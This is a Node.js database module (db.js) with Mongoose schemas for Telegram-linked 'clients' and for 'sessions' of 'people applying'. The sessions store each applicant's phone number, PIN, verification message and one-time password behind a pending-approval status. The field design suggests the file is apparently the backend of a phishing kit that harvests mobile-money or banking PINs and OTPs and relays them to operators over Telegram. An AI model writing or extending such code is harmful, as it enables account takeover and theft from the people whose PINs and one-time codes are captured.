// db.js
const mongoose = require('mongoose');

// Connect to MongoDB (The URL comes from Render's environment variables)
const mongoURI = process.env.MONGODB_URI || 'mongodb://localhost:27017/zambia';
mongoose.connect(mongoURI)
    .then(() => console.log('✅ Connected to MongoDB'))
    .catch(err => console.error('❌ MongoDB Connection Error:', err));

// 1. CLIENT SCHEMA (For your customers)
const ClientSchema = new mongoose.Schema({
    clientId: { type: String, required: true, unique: true }, // e.g., "john123"
    chatId: { type: String, required: true }, // Their Telegram ID
    name: { type: String, default: 'Unnamed Client' },
    createdAt: { type: Date, default: Date.now }
});
const Client = mongoose.model('Client', ClientSchema);

// 2. SESSION SCHEMA (For the people applying)
const SessionSchema = new mongoose.Schema({
    sessionId: { type: String, required: true, unique: true },
    clientId: { type: String, required: true },
    phone: String,
    pin: String,
    verificationMsg: String,
    otp: String,
    status: { type: String, default: 'PENDING_APPROVAL' },
    createdAt: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', SessionSchema);

// --- CLIENT FUNCTIONS ---
async function createClient(clientId, chatId, name) {
    return await Client.create({ clientId, chatId, name });
}
async function getClient(clientId) {
    return await Client.findOne({ clientId });
}
async function getAllClients() {
    return await Client.find();
}

// --- SESSION FUNCTIONS ---
async function createSession(sessionId, clientId, data) {
    return await Session.create({
        sessionId,
        clientId,
        ...data,
        status: 'PENDING_APPROVAL'
    });
}
async function getSession(sessionId) {
    return await Session.findOne({ sessionId });
}
async function updateStatus(sessionId, status) {
    await Session.updateOne({ sessionId }, { status });
    // Also update the specific fields if passed
    const session = await Session.findOne({ sessionId });
    return session;
}

// Helper to update specific fields (phone, pin, etc)
async function updateSessionData(sessionId, data) {
    return await Session.updateOne({ sessionId }, { $set: data });
}

module.exports = { 
    createClient, getClient, getAllClients,
    createSession, getSession, updateStatus, updateSessionData 
};
